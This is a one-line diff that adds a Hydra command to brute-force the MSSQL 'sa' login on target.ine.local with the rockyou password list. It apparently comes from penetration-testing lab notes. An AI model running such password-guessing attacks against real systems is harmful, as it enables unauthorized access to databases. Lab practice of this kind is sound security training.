@@ -1,0 +1,1 @@
+`hydra -l sa -P /usr/share/wordlists/rockyou.txt target.ine.local mssql -V `
